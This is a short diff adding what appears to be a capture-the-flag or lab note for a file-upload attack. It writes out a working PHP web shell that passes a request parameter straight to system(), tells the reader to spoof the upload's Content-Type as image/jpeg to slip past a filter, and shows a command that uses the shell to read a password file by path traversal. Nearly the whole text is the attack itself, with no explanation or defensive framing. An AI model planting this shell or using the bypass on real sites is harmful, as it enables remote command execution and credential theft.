@@ -1,0 +1,7 @@
+shell.php
+<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
+
+upload shell file
+change "Content-Type: application/x-php" to "Content-Type: image/jpeg" 
+
+shell.php?cmd=cat ../../../.passwd
